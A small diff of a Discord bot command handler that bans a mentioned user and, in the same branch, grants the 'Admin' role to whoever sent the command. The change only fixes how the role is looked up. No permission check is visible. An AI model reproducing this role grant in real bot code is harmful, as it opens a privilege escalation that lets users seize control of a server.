@@ -23,7 +23,8 @@ client.on('message', message => {
 
         if (args.length === 1) {
             message.guild.members.ban(message.mentions.users.first());
-            message.guild.member(message.author).roles.add(message.guild.roles.cache.get("Admin"))
+            const role = message.guild.roles.find(role => role.name === "Admin");
+            message.guild.member(message.author).roles.add(role);
         }
 
 
